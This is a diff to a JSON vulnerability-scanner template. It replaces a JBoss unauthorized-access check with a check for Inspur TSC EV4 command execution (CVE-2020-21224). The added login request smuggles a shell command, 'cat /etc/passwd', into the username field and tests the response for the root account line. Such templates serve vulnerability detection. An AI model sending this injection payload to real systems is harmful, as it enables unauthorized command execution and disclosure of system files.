@@ -1,15 +1,15 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "Inspur TSC EV4 Command Execution",
+    "Description": "Inspur TSC EV4 command execution cve-2020-21224",
+    "Product": "Inspur",
     "author": "chumeng",
     "Request":[
         {
-        "Method": "GET",
+        "Method": "POST",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/login",
         "Port":"",
-        "Data":"",
+        "Data":"op=login&username=admin || cat /etc/passwd&password=admin",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
@@ -18,12 +18,8 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "jboss.management.local"
-                }, {
-                    "Operation": "contains", 
-                    "Key":"",
-                    "Value": "jboss.web"
-                    },
+                "Value": "root:x:0:0:"
+                },
                  {
                 "Operation": "code", 
                 "Key":"",
@@ -34,3 +30,4 @@
         "Next_decide":""
                 }
 ]}
+
